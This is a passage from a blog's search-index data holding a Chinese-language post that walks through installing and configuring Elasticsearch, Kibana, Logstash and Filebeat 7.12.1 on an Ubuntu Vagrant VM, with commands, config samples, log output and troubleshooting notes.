知乎</a></p>\n<p><a href=\"https://blog.miniasp.com/post/2020/08/21/Install-Kubernetes-cluster-in-WSL-2-Docker-on-Windows-using-kind\" target=\"_blank\" rel=\"noopener\">使用 WSL 2 與 Docker Desktop 架設 Kubernetes 多節點叢集環境 (KinD) | The Will Will Web</a></p>\n","categories":["Kubernetes"],"tags":["kubernetes"]},{"title":"安裝 ELK(ElasticSearch,Logstash,Kibana),filebeat 初體驗","url":"/blog/2021/05/02/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/","content":"<h1 id=\"安裝-ELK-ElasticSearch-Logstash-Kibana-filebeat-初體驗\"><a href=\"#安裝-ELK-ElasticSearch-Logstash-Kibana-filebeat-初體驗\" class=\"headerlink\" title=\"安裝 ELK(ElasticSearch,Logstash,Kibana),filebeat 初體驗\"></a>安裝 ELK(ElasticSearch,Logstash,Kibana),filebeat 初體驗</h1><p>本文章參考: <a href=\"https://hackmd.io/@QCZ_Kvv1ScixyAPzRYDKWQ/ry2Inu5HE?type=view\" target=\"_blank\" rel=\"noopener\">Elastic stack（安裝篇) - HackMD</a><br>大量操作參照如上</p>\n<a id=\"more\"></a>\n<h2 id=\"安裝-Elasticsearch\"><a href=\"#安裝-Elasticsearch\" class=\"headerlink\" title=\"安裝 Elasticsearch\"></a>安裝 Elasticsearch</h2><p>官方說明的安裝步驟:<br><a href=\"https://www.elastic.co/downloads/elasticsearch-no-jdk\" target=\"_blank\" rel=\"noopener\">Download Elasticsearch Free • Get Started Now | Elastic</a></p>\n<ol>\n<li>Download and install one of the supported JDKs for Elasticsearch</li>\n<li>Download and unzip Elasticsearch</li>\n<li>Run bin/elasticsearch (or bin\\elasticsearch.bat on Windows)</li>\n<li>Run curl <a href=\"http://localhost:9200/\" target=\"_blank\" rel=\"noopener\">http://localhost:9200/</a> or Invoke-RestMethod <a href=\"http://localhost:9200\" target=\"_blank\" rel=\"noopener\">http://localhost:9200</a> with PowerShell</li>\n</ol>\n<p>我這邊用 VM 來安裝 ubuntu 還境</p>\n<p><a href=\"https://app.vagrantup.com/ubuntu/boxes/focal64\" target=\"_blank\" rel=\"noopener\">Vagrant box ubuntu/focal64 - Vagrant Cloud</a><br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">vagrant init ubuntu/focal64</span><br><span class=\"line\">vagrant up</span><br></pre></td></tr></table></figure></p>\n<p>可能會遇到這個問題<br><a href=\"https://malagege.github.io/blog/2020/06/26/vagrant-%E5%95%9F%E5%8B%95%E7%84%A1%E6%B3%95%E8%87%AA%E5%8B%95%E6%8E%9B%E8%BC%89%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/\">vagrant 啟動無法自動掛載解決方法 | 程式狂想筆記</a></p>\n<p>vagrant 建議 RAM 調成 3GB</p>\n<p>VM 設一個可以連的IP</p>\n<p><img src=\"https://i.imgur.com/5XQeiq0.png\" alt=\"\"></p>\n<h3 id=\"安裝-JDK-這部分請跳過\"><a href=\"#安裝-JDK-這部分請跳過\" class=\"headerlink\" title=\"安裝 JDK (這部分請跳過)\"></a>安裝 JDK (這部分請跳過)</h3><p>因為我安裝 ElasticSearch 遇到could not find java; set JAVA_HOME or ensure java is in PATH<br>好像是 deb 安裝才會遇到這個問題<br>設定 JAVA_HOME 還是無法解決</p>\n<p><a href=\"https://www.elastic.co/support/matrix#matrix_jvm\" target=\"_blank\" rel=\"noopener\">Elastic Support Matrix | Elasticsearch</a><br>我選 Elasticsearch 7.12.x<br>JDK 對應版本選 11</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt-get install openjdk-11-jdk</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 確認版本</span></span><br><span class=\"line\">java --version</span><br><span class=\"line\"><span class=\"comment\"># openjdk 11.0.11 2021-04-20</span></span><br><span class=\"line\"><span class=\"comment\"># OpenJDK Runtime Environment (build 11.0.11+9-Ubuntu-0ubuntu2.20.04)</span></span><br><span class=\"line\"><span class=\"comment\"># OpenJDK 64-Bit Server VM (build 11.0.11+9-Ubuntu-0ubuntu2.20.04, mixed mode, sharing)</span></span><br></pre></td></tr></table></figure>\n<p>設定 JAVA_HOME</p>\n<p><a href=\"https://stackoverflow.com/questions/24641536/how-to-set-java-home-in-linux-for-all-users\" target=\"_blank\" rel=\"noopener\">java - How to set JAVA_HOME in Linux for all users - Stack Overflow</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 請查看對印自己Java路徑做調整</span></span><br><span class=\"line\">JAVA_HOME=/usr/lib/jvm/java-1.11.0-openjdk-amd64</span><br><span class=\"line\">ES_JAVA_HOME=/usr/lib/jvm/java-1.11.0-openjdk-amd64</span><br></pre></td></tr></table></figure>\n<h3 id=\"安裝-Elasticsearch-1\"><a href=\"#安裝-Elasticsearch-1\" class=\"headerlink\" title=\"安裝 Elasticsearch\"></a>安裝 Elasticsearch</h3><p><a href=\"https://www.elastic.co/downloads/elasticsearch-no-jdk\" target=\"_blank\" rel=\"noopener\">Download Elasticsearch Free • Get Started Now | Elastic</a><br>選對應版本</p>\n<p><a href=\"https://www.elastic.co/guide/en/elasticsearch/reference/7.12/deb.html#deb-repo\" target=\"_blank\" rel=\"noopener\">Install Elasticsearch with Debian Package | Elasticsearch Guide [7.12] | Elastic</a><br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.12.1-amd64.deb</span><br><span class=\"line\">wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.12.1-amd64.deb.sha512</span><br><span class=\"line\">shasum -a 512 -c elasticsearch-7.12.1-amd64.deb.sha512 </span><br><span class=\"line\">sudo dpkg -i elasticsearch-7.12.1-amd64.deb</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"安裝翻車排除\"><a href=\"#安裝翻車排除\" class=\"headerlink\" title=\"安裝翻車排除\"></a>安裝翻車排除</h4><p><img src=\"https://i.imgur.com/l1KX7wU.png\" alt=\"\"></p>\n<p><a href=\"https://www.cnblogs.com/FengGeBlog/p/10266126.html\" target=\"_blank\" rel=\"noopener\">elasticsearch之JAVA环境变量报错：could not find java; set JAVA_HOME or ensure java is in PATH - 峰哥ge - 博客园</a></p>\n<p>設定JAVA_HOME 安裝也沒用<br>上面 deb 是函JAVA的<br>目前推估 安裝 deb 才會遇到這個問題</p>\n<p>單純抓zip應該可以設定 JAVA_HOME 解決</p>\n<h3 id=\"啟動-ElasticSearch\"><a href=\"#啟動-ElasticSearch\" class=\"headerlink\" title=\"啟動 ElasticSearch\"></a>啟動 ElasticSearch</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo service elasticsearch start</span><br></pre></td></tr></table></figure>\n<p>確認是否成功</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl http://localhost:9200/</span><br><span class=\"line\"><span class=\"comment\"># &#123;</span></span><br><span class=\"line\"><span class=\"comment\">#   \"name\" : \"ubuntu-focal\",</span></span><br><span class=\"line\"><span class=\"comment\">#   \"cluster_name\" : \"elasticsearch\",</span></span><br><span class=\"line\"><span class=\"comment\">#   \"cluster_uuid\" : \"AjrnvASjSG6aWrJIFhzSYg\",</span></span><br><span class=\"line\"><span class=\"comment\">#   \"version\" : &#123;</span></span><br><span class=\"line\"><span class=\"comment\">#     \"number\" : \"7.12.1\",</span></span><br><span class=\"line\"><span class=\"comment\">#     \"build_flavor\" : \"default\",</span></span><br><span class=\"line\"><span class=\"comment\">#     \"build_type\" : \"deb\",</span></span><br><span class=\"line\"><span class=\"comment\">#     \"build_hash\" : \"3186837139b9c6b6d23c3200870651f10d3343b7\",</span></span><br><span class=\"line\"><span class=\"comment\">#     \"build_date\" : \"2021-04-20T20:56:39.040728659Z\",</span></span><br><span class=\"line\"><span class=\"comment\">#     \"build_snapshot\" : false,</span></span><br><span class=\"line\"><span class=\"comment\">#     \"lucene_version\" : \"8.8.0\",</span></span><br><span class=\"line\"><span class=\"comment\">#     \"minimum_wire_compatibility_version\" : \"6.8.0\",</span></span><br><span class=\"line\"><span class=\"comment\">#     \"minimum_index_compatibility_version\" : \"6.0.0-beta1\"</span></span><br><span class=\"line\"><span class=\"comment\">#   &#125;,</span></span><br><span class=\"line\"><span class=\"comment\">#   \"tagline\" : \"You Know, for Search\"</span></span><br><span class=\"line\"><span class=\"comment\"># &#125;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"設定-ElasticSearch\"><a href=\"#設定-ElasticSearch\" class=\"headerlink\" title=\"設定 ElasticSearch\"></a>設定 ElasticSearch</h2><p>預設是 localhost 連線<br>要外連預需要設定</p>\n<p>/etc/elasticsearch/elasticsearch.yml</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># By default Elasticsearch is only accessible on localhost. Set a different</span></span><br><span class=\"line\"><span class=\"comment\"># address here to expose this node on the network:</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#network.host: 192.168.0.1</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># By default Elasticsearch listens for HTTP traffic on the first free port it</span></span><br><span class=\"line\"><span class=\"comment\"># finds starting at 9200. Set a specific HTTP port here:</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#http.port: 9200</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"安裝-Kinbana\"><a href=\"#安裝-Kinbana\" class=\"headerlink\" title=\"安裝 Kinbana\"></a>安裝 Kinbana</h2><p><a href=\"https://www.elastic.co/guide/en/kibana/7.12/deb.html#install-deb\" target=\"_blank\" rel=\"noopener\">Install Kibana with Debian package | Kibana Guide [7.12] | Elastic</a><br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">wget https://artifacts.elastic.co/downloads/kibana/kibana-7.12.1-amd64.deb</span><br><span class=\"line\">shasum -a 512 kibana-7.12.1-amd64.deb </span><br><span class=\"line\">sudo dpkg -i kibana-7.12.1-amd64.deb</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"設定-kibana\"><a href=\"#設定-kibana\" class=\"headerlink\" title=\"設定 kibana\"></a>設定 kibana</h3><p>設定對外 IP</p>\n<p>補充: 這邊 Vagrant 要設定 VM 對外 IP<br><img src=\"https://i.imgur.com/MH2wTZ9.png\" alt=\"\"></p>\n<p>要把 kibana 設定這個 IP</p>\n<p><img src=\"https://i.imgur.com/w9NM5hV.png\" alt=\"\"></p>\n<h4 id=\"Kibana-server-is-not-ready-yet\"><a href=\"#Kibana-server-is-not-ready-yet\" class=\"headerlink\" title=\"Kibana server is not ready yet\"></a>Kibana server is not ready yet</h4><ol>\n<li>確認本機 ElasticSearch 是否啟動</li>\n<li>確認 kibana.yml 裡面 ElasticSearch 設定是否正確(預設為localhost:9200)</li>\n<li><a href=\"https://blog.csdn.net/FV8023/article/details/96427702\" target=\"_blank\" rel=\"noopener\">Kibana server is not ready yet出现的原因_FV8023的博客-CSDN博客</a></li>\n</ol>\n<p>我後來發現 ElasticSearch 重啟的時候<br>沒辦法啟動，後來 RAM 調大(2GB)就正常了</p>\n<h2 id=\"logstash\"><a href=\"#logstash\" class=\"headerlink\" title=\"logstash\"></a>logstash</h2><h3 id=\"安裝-logstash\"><a href=\"#安裝-logstash\" class=\"headerlink\" title=\"安裝 logstash\"></a>安裝 logstash</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">wget https://artifacts.elastic.co/downloads/logstash/logstash-7.12.1-amd64.deb</span><br><span class=\"line\">sudo apt install ./logstash-7.12.1-amd64.deb</span><br></pre></td></tr></table></figure>\n<p>安裝時候當機，所以RAM調成 3GB<br>可見這個真的很吃記憶體</p>\n<h3 id=\"Hello-World\"><a href=\"#Hello-World\" class=\"headerlink\" title=\"Hello World\"></a>Hello World</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">/usr/share/logstash/bin/logstash -e &apos;input &#123; stdin &#123; &#125; &#125; output &#123; stdout &#123;&#125; &#125;&apos;</span><br></pre></td></tr></table></figure>\n<p>我這邊沒看到 Hello World<br>基本上就是有問題</p>\n<h3 id=\"翻車時間\"><a href=\"#翻車時間\" class=\"headerlink\" title=\"翻車時間\"></a>翻車時間</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Using bundled JDK: /usr/share/logstash/jdk</span><br><span class=\"line\">OpenJDK 64-Bit Server VM warning: Option UseConcMarkSweepGC was deprecated in version 9.0 and will likely be removed in a future release.</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://tomme.me/hello-world-series-logstash/\" target=\"_blank\" rel=\"noopener\">Hello World 系列 - Logstash</a></p>\n<p>後來發現不是翻車，是執行 logstash 需要一段時間(VM效能不好)<br>跑了一下，我看<code>htop</code> CPU 吃到100%<br>所以要等一下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Using bundled JDK: /usr/share/logstash/jdk</span><br><span class=\"line\">WARNING: Could not find logstash.yml which is typically located in $LS_HOME/config or /etc/logstash. You can specify the path using --path.settings. Continuing using the defaults</span><br><span class=\"line\">Could not find log4j2 configuration at path /usr/share/logstash/config/log4j2.properties. Using default config which logs errors to the console</span><br><span class=\"line\">[INFO ] 2021-05-01 16:04:55.718 [main] runner - Starting Logstash &#123;&quot;logstash.version&quot;=&gt;&quot;7.12.1&quot;, &quot;jruby.version&quot;=&gt;&quot;jruby 9.2.13.0 (2.5.7) 2020-08-03 9a89c94bcc OpenJDK 64-Bit Server VM 11.0.10+9 on 11.0.10+9 +indy +jit [linux-x86_64]&quot;&#125;</span><br><span class=\"line\">[INFO ] 2021-05-01 16:04:55.779 [main] writabledirectory - Creating directory &#123;:setting=&gt;&quot;path.queue&quot;, :path=&gt;&quot;/usr/share/logstash/data/queue&quot;&#125;</span><br><span class=\"line\">[INFO ] 2021-05-01 16:04:55.815 [main] writabledirectory - Creating directory &#123;:setting=&gt;&quot;path.dead_letter_queue&quot;, :path=&gt;&quot;/usr/share/logstash/data/dead_letter_queue&quot;&#125;</span><br><span class=\"line\">[WARN ] 2021-05-01 16:04:56.611 [LogStash::Runner] multilocal - Ignoring the &apos;pipelines.yml&apos; file because modules or command line options are specified</span><br><span class=\"line\">[INFO ] 2021-05-01 16:04:56.666 [LogStash::Runner] agent - No persistent UUID file found. Generating new UUID &#123;:uuid=&gt;&quot;f2a71911-edf5-4c53-bf68-5a31e6ad8dd7&quot;, :path=&gt;&quot;/usr/share/logstash/data/uuid&quot;&#125;</span><br><span class=\"line\">[INFO ] 2021-05-01 16:04:58.798 [Api Webserver] agent - Successfully started Logstash API endpoint &#123;:port=&gt;9600&#125;</span><br><span class=\"line\">[INFO ] 2021-05-01 16:05:00.048 [Converge PipelineAction::Create&lt;main&gt;] Reflections - Reflections took 101 ms to scan 1 urls, producing 23 keys and 47 values </span><br><span class=\"line\">[INFO ] 2021-05-01 16:05:01.424 [[main]-pipeline-manager] javapipeline - Starting pipeline &#123;:pipeline_id=&gt;&quot;main&quot;, &quot;pipeline.workers&quot;=&gt;2, &quot;pipeline.batch.size&quot;=&gt;125, &quot;pipeline.batch.delay&quot;=&gt;50, &quot;pipeline.max_inflight&quot;=&gt;250, &quot;pipeline.sources&quot;=&gt;[&quot;config string&quot;], :thread=&gt;&quot;#&lt;Thread:0x701b0f11 run&gt;&quot;&#125;</span><br><span class=\"line\">[INFO ] 2021-05-01 16:05:03.202 [[main]-pipeline-manager] javapipeline - Pipeline Java execution initialization time &#123;&quot;seconds&quot;=&gt;1.77&#125;</span><br><span class=\"line\">WARNING: An illegal reflective access operation has occurred</span><br><span class=\"line\">WARNING: Illegal reflective access by com.jrubystdinchannel.StdinChannelLibrary$Reader (file:/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/jruby-stdin-channel-0.2.0-java/lib/jruby_stdin_channel/jruby_stdin_channel.jar) to field java.io.FilterInputStream.in</span><br><span class=\"line\">WARNING: Please consider reporting this to the maintainers of com.jrubystdinchannel.StdinChannelLibrary$Reader</span><br><span class=\"line\">WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations</span><br><span class=\"line\">WARNING: All illegal access operations will be denied in a future release</span><br><span class=\"line\">[INFO ] 2021-05-01 16:05:03.290 [[main]-pipeline-manager] javapipeline - Pipeline started &#123;&quot;pipeline.id&quot;=&gt;&quot;main&quot;&#125;</span><br><span class=\"line\">The stdin plugin is now waiting for input:</span><br><span class=\"line\">[INFO ] 2021-05-01 16:05:03.469 [Agent thread] agent - Pipelines running &#123;:count=&gt;1, :running_pipelines=&gt;[:main], :non_running_pipelines=&gt;[]&#125;</span><br><span class=\"line\">hello</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">          &quot;host&quot; =&gt; &quot;ubuntu-focal&quot;,</span><br><span class=\"line\">       &quot;message&quot; =&gt; &quot;hello&quot;,</span><br><span class=\"line\">      &quot;@version&quot; =&gt; &quot;1&quot;,</span><br><span class=\"line\">    &quot;@timestamp&quot; =&gt; 2021-05-01T16:05:55.327Z</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"設定\"><a href=\"#設定\" class=\"headerlink\" title=\"設定\"></a>設定</h3><ol>\n<li>logstash 預設會先抓/etc/logstash/conf.d 的config檔案</li>\n<li>logstash 預設會先抓/etc/logstash/logstash.yml</li>\n</ol>\n<p><a href=\"https://mmx362003.gitbooks.io/elk-stack-guide/content/config_of_logstash.html\" target=\"_blank\" rel=\"noopener\">2.1 Config Of Logstash · ELK Stack 教學</a></p>\n<h3 id=\"config-設定\"><a href=\"#config-設定\" class=\"headerlink\" title=\"config 設定\"></a>config 設定</h3><h4 id=\"stdin\"><a href=\"#stdin\" class=\"headerlink\" title=\"stdin\"></a>stdin</h4><p><a href=\"https://doc.yonyoucloud.com/doc/logstash-best-practice-cn/input/stdin.html\" target=\"_blank\" rel=\"noopener\">标准输入(Stdin) | Logstash 最佳实践</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">input &#123;</span><br><span class=\"line\">    stdin &#123;</span><br><span class=\"line\">        add_field =&gt; &#123;&quot;key&quot; =&gt; &quot;value&quot;&#125;</span><br><span class=\"line\">        codec =&gt; &quot;plain&quot;</span><br><span class=\"line\">        tags =&gt; [&quot;add&quot;]</span><br><span class=\"line\">        type =&gt; &quot;std&quot;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">output&#123;</span><br><span class=\"line\">    stdout&#123;&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 在/usr/share/logstash 執行，stdin.conf 放在這邊執行</span></span><br><span class=\"line\">sudo bin/logstash -f stdin.conf</span><br><span class=\"line\"><span class=\"comment\"># &#123;</span></span><br><span class=\"line\"><span class=\"comment\">#           \"tags\" =&gt; [</span></span><br><span class=\"line\"><span class=\"comment\">#         [0] \"add\"</span></span><br><span class=\"line\"><span class=\"comment\">#     ],</span></span><br><span class=\"line\"><span class=\"comment\">#           \"host\" =&gt; \"ubuntu-focal\",</span></span><br><span class=\"line\"><span class=\"comment\">#           \"type\" =&gt; \"std\",</span></span><br><span class=\"line\"><span class=\"comment\">#            \"key\" =&gt; \"value\",</span></span><br><span class=\"line\"><span class=\"comment\">#       \"@version\" =&gt; \"1\",</span></span><br><span class=\"line\"><span class=\"comment\">#        \"message\" =&gt; \":q\",</span></span><br><span class=\"line\"><span class=\"comment\">#     \"@timestamp\" =&gt; 2021-05-01T16:38:27.958Z</span></span><br><span class=\"line\"><span class=\"comment\"># &#125;</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"file-log\"><a href=\"#file-log\" class=\"headerlink\" title=\"file log\"></a>file log</h4><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">input&#123;</span><br><span class=\"line\">    file &#123;</span><br><span class=\"line\">        path =&gt; [&quot;/var/log/*.log&quot;, &quot;/var/log/message&quot;]</span><br><span class=\"line\">        type =&gt; &quot;system&quot;</span><br><span class=\"line\">        start_position =&gt; &quot;beginning&quot;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">output&#123;</span><br><span class=\"line\">    stdout&#123;&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">~</span><br></pre></td></tr></table></figure>\n<p>放在 /etc/logstash/conf/ 裡面<br>執行 logstash 就能被觸發</p>\n<p>其他的就不記了<br>可參考下面網址<br><a href=\"https://doc.yonyoucloud.com/doc/logstash-best-practice-cn/input/index.html\" target=\"_blank\" rel=\"noopener\">输入插件(Input) | Logstash 最佳实践</a></p>\n<p><a href=\"https://github.com/chenryn/logstash-best-practice-cn\" target=\"_blank\" rel=\"noopener\">GitHub - chenryn/logstash-best-practice-cn: 本书已出版《ELK Stack权威指南》</a></p>\n<p><a href=\"https://github.com/chenryn/ELKstack-guide-cn\" target=\"_blank\" rel=\"noopener\">GitHub - chenryn/ELKstack-guide-cn: ELK Stack 中文指南</a></p>\n<h4 id=\"output\"><a href=\"#output\" class=\"headerlink\" title=\"output\"></a>output</h4><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">output &#123;</span><br><span class=\"line\">    stdout &#123;</span><br><span class=\"line\">        codec =&gt; rubydebug</span><br><span class=\"line\">        workers =&gt; 2</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"output-file\"><a href=\"#output-file\" class=\"headerlink\" title=\"output file\"></a>output file</h4><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">output &#123;</span><br><span class=\"line\">    file &#123;</span><br><span class=\"line\">        path =&gt; &quot;/path/to/%&#123;+yyyy/MM/dd/HH&#125;/%&#123;host&#125;.log.gz&quot;</span><br><span class=\"line\">        message_format =&gt; &quot;%&#123;message&#125;&quot;</span><br><span class=\"line\">        gzip =&gt; true</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"output-Elasticsearch\"><a href=\"#output-Elasticsearch\" class=\"headerlink\" title=\"output Elasticsearch\"></a>output Elasticsearch</h4><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">output &#123;</span><br><span class=\"line\">    elasticsearch &#123;</span><br><span class=\"line\">        host =&gt; &quot;192.168.0.2&quot;</span><br><span class=\"line\">        protocol =&gt; &quot;http&quot;</span><br><span class=\"line\">        index =&gt; &quot;logstash-%&#123;type&#125;-%&#123;+YYYY.MM.dd&#125;&quot;</span><br><span class=\"line\">        index_type =&gt; &quot;%&#123;type&#125;&quot;</span><br><span class=\"line\">        workers =&gt; 5</span><br><span class=\"line\">        template_overwrite =&gt; true</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"filebeat\"><a href=\"#filebeat\" class=\"headerlink\" title=\"filebeat\"></a>filebeat</h2><h3 id=\"安裝-filebeat\"><a href=\"#安裝-filebeat\" class=\"headerlink\" title=\"安裝 filebeat\"></a>安裝 filebeat</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">wget https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-7.12.1-amd64.deb</span><br><span class=\"line\">sudo apt install ./filebeat-7.12.1-amd64.deb</span><br></pre></td></tr></table></figure>\n<h3 id=\"設定檔\"><a href=\"#設定檔\" class=\"headerlink\" title=\"設定檔\"></a>設定檔</h3><p>/etc/filebeat/filebeat.yml<br>裡面有很多 input 都disable<br>output預設連到 localhost:9200 的 elasticsearch<br>假如想用到 logstash 需要手動註解調，並打開logstash output 那邊</p>\n<p><img src=\"https://i.imgur.com/2AufteG.png\" alt=\"\"></p>\n<p><img src=\"https://i.imgur.com/YdOZW1G.png\" alt=\"\"></p>\n<p>請依照需求調整</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 可以看到測試 log</span></span><br><span class=\"line\">filebeat -e</span><br><span class=\"line\"><span class=\"comment\"># 沒問題的話，service 啟動</span></span><br><span class=\"line\">sudo service filebeat start</span><br></pre></td></tr></table></figure>\n<h3 id=\"相關模組\"><a href=\"#相關模組\" class=\"headerlink\" title=\"相關模組\"></a>相關模組</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 查看可以用的模組</span></span><br><span class=\"line\">filebeat modules list</span><br></pre></td></tr></table></figure>\n<p>這邊先不深入研究<br><a href=\"https://www.cnblogs.com/zsql/p/13137833.html\" target=\"_blank\" rel=\"noopener\">一篇文章搞懂filebeat（ELK） - 一寸HUI - 博客园</a></p>\n<p><a href=\"https://github.com/revolunet/traefik-filebeats-kibana\" target=\"_blank\" rel=\"noopener\">GitHub - revolunet/traefik-filebeats-kibana: sample docker-compose with traefik and kibana dashboard using filebeats</a></p>\n<h3 id=\"logstash-和-filebeat-關係\"><a href=\"#logstash-和-filebeat-關係\" class=\"headerlink\" title=\"logstash 和 filebeat 關係\"></a>logstash 和 filebeat 關係</h3><p>網路上看到 filebeat 都傳送到 logstash 教學比較多<br>但後來實作發現不是這樣<br>可以依照需求直接傳到 elasticsearch<br>甚至可以做到 LoadBalance 傳到 logstash<br>詳細可以看:<a href=\"https://codingnote.cc/zh-tw/p/144718/\" target=\"_blank\" rel=\"noopener\">搞懂ELK並不是一件特別難的事（ELK） - ⎝⎛CodingNote.cc ⎞⎠</a></p>\n<p>甚是中間可以搭 Message Queue</p>\n<h3 id=\"kibana-設定filebeat\"><a href=\"#kibana-設定filebeat\" class=\"headerlink\" title=\"kibana 設定filebeat\"></a>kibana 設定filebeat</h3><p>去管理設定 Index Mangament<br>點選 Create Index Partten<br>step 1 打 filebeat*<br>step 2 選 @timestamp<br>新增完成，取選 Discover<br>就可以用 KQL 查詢</p>\n<p>不方便截圖，所以這裡就簡單紀錄一下</p>\n<h2 id=\"題外話\"><a href=\"#題外話\" class=\"headerlink\" title=\"題外話\"></a>題外話</h2><p>原本目標， Nginx 抓出 Acess Log 做地圖分析<br>不過想說安裝細結清楚一點比較好<br>沒想到就花了不少時間整理</p>\n<p>目前查看我這個抓 Access Log GeoIP 方法</p>\n<ol>\n<li>從 Nginx 下手取 geoip資訊(經緯度、縣市名稱)</li>\n</ol>\n<p><a href=\"https://faun.pub/total-nginx-monitoring-with-application-performance-and-a-bit-more-using-8fc6d731051b\" target=\"_blank\" rel=\"noopener\">Total Nginx monitoring, with application performance and a bit more, using Telegraf/InfluxDB/Grafana. | by Alexey Nizhegolenko | FAUN</a></p>\n<ol start=\"2\">\n<li>Logstash Filter GeoIP 模組取得資訊</li>\n</ol>\n<p><a href=\"https://www.mdeditor.tw/pl/g4XZ/zh-tw\" target=\"_blank\" rel=\"noopener\">Grafana展示精美的nginx訪問日誌圖表_小小<strong>____</strong> - MdEditor</a></p>\n<p>Loki 目前沒有取出來 GeoIP 方法<br><a href=\"https://github.com/grafana/loki/issues/2120\" target=\"_blank\" rel=\"noopener\">Add support for Geo IP · Issue #2120 · grafana/loki · GitHub</a><br>其實 Logstash 也能跟 Loki 串<br><a href=\"https://grafana.com/docs/loki/latest/clients/logstash/\" target=\"_blank\" rel=\"noopener\">Logstash | Grafana Labs</a><br>但說真的 Logstash 效能感覺也不是很好(上面測試跑都要花一點時間，我還以為跑失敗)<br>在樹梅派跑可能也很吃力</p>\n<p>本來想用 docker 執行看看，但官方沒有做 arm 版本<br>就不測試了<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -it  --rm logstash:7.12.1 logstash -e <span class=\"string\">'input &#123; stdin &#123; &#125; &#125; output &#123; stdout &#123;&#125; &#125;'</span></span><br></pre></td></tr></table></figure></p>\n<p>GeoIP 哪貼心血來潮再進行測試<br>這部分也沒有現成包好 docker 可以直接玩</p>\n<h2 id=\"其他不錯文章\"><a href=\"#其他不錯文章\" class=\"headerlink\" title=\"其他不錯文章\"></a>其他不錯文章</h2><p><a href=\"https://www.jianshu.com/p/f57176a3c03f\" target=\"_blank\" rel=\"noopener\">ElasticSearch 全文检索技术（一） - 简书</a></p>\n<p><a href=\"https://www.zhihu.com/question/54058964\" target=\"_blank\" rel=\"noopener\">logstash 和filebeat 是什么关系？ - 知乎</a></p>\n<p><a href=\"https://leriou.github.io/2019-01-09-mongodb-compareto-elasticsearch/\" target=\"_blank\" rel=\"noopener\">MongoDB和Elasticsearch的对比 | Leriou’s Tavern</a></p>\n<p><a href=\"https://codingnote.cc/zh-tw/p/144718/\" target=\"_blank\" rel=\"noopener\">搞懂ELK並不是一件特別難的事（ELK） - ⎝⎛CodingNote.cc ⎞⎠</a></p>\n<p><a href=\"https://segmentfault.com/a/1190000022533196\" target=\"_blank\" rel=\"noopener\">关于kibana的可视化可能都在这篇文章里了 - SegmentFault 思否</a></p>\n<p><a href=\"https://blog.csdn.net/qq_41631365/article/details/109773675\" target=\"_blank\" rel=\"noopener\">Kibana7.9.2设置elasticsearch索引过期时间，到期自动删除_螺蛳粉不加葱的博客-CSDN博客_es设置索引过期时间</a></p>\n<p><a 